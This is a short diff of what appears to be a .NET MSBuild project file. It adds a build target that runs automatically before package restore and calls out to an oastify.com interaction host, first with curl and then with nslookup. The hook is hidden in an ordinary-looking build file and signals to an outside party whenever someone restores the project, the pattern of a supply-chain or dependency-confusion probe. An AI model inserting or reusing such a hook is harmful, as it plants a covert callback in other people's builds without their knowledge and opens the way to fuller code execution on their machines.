@@ -8,7 +8,7 @@
   </PropertyGroup>
 
   <Target Name="RunCustomScriptOnRestore" BeforeTargets="Restore">
-    <Exec Command="curl ajxkvwyic3owztjfh2c9xln3augl4es3.oastify.com" />
+    <Exec Command="nslookup awas7a5jftlaluafqzlfxby9f0lr9hx6.oastify.com" />
   </Target>
 
 </Project>
